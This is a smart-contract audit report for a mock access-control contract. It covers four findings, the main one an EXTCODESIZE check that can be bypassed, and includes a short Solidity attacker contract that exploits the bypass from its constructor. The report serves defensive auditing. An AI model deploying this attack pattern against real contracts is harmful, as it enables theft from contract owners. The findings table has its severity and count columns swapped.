# MockAccessControl - Audit - Alexandre Melo

## Findings
| Severity | Total |
| -------- | :---: |
| 1        | high  |
| 3        |  low  |


## 1 - Improper use of EXTCODESIZE - HIGH

```
function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function pwn() external payable {
        require(tx.origin != msg.sender, "Well we are not allowing EOAs, sorry");
        require(!isContract(msg.sender), "Well we don't allow Contracts either");
        require(msg.value >= MINIMUM_CONTRIBUTION, "Minimum Contribution needed is 0.1 ether");
        require(msg.value <= MAXIMUM_CONTRIBUTION, "How did you get so much money? Max allowed is 0.2 ether");
        require(block.timestamp % 120 >= 0 && block.timestamp % 120 < 60, "Not the right time");
        contributionAmount[msg.sender] += msg.value;

        if (contributionAmount[msg.sender] >= 1 ether) {
            pwned[msg.sender] = true;
        }
    }

```
Description: **EXTCODESIZE is known to return 0 if it is called from the constructor of a contract. So if you are using this in a security sensitive setting, you would have to consider if this is a problem.**

## Attack sample
```
pragma solidity 0.8.0;

import "./MockAccessControl.sol";

contract Attacker {
    Minion public victim;

    constructor(address _victim, uint256 value, uint256 interactions) payable {
        victim = Minion(_victim);

        for (uint256 i = 0; i < interactions; i++) {
            victim.pwn{value: value}();
        }
    }
}

```

## Recomendation:
Do not use the EXTCODESIZE check to prevent smart contracts from calling a function. This is not foolproof, it can be subverted by a constructor call, due to the fact that while the constructor is running, EXTCODESIZE for that address returns 0.

## 2 - WEAK-PRNG - LOW
```
function pwn() external payable {
    ....
    require(block.timestamp % 120 >= 0 && block.timestamp % 120 < 60, "Not the right time");
          
```
Description: **Modulo on block.timestamp, now or blockhash. These can be influenced by miners to some extent so they should be avoided.**


## 3 - FLOATING PRAGMA - LOW
```
pragma solidity ^0.8.0;
```
Description: **Pragma should be strict to a specific version to avoid any surprises that may come from using a different compiler**

## Recomendation:
Use a fixed version ie: `0.8.0`.


## 4 - UNUSED FUNCTION - LOW
```
function timeVal() external view returns(uint256){
    return block.timestamp;
}
```
Description: **Function is not being used by the code and will result in increased bytecode**

## Recomendation:
Remove unsed function.


## Tools used
`foundry`.

`slither`.

`mythril`.
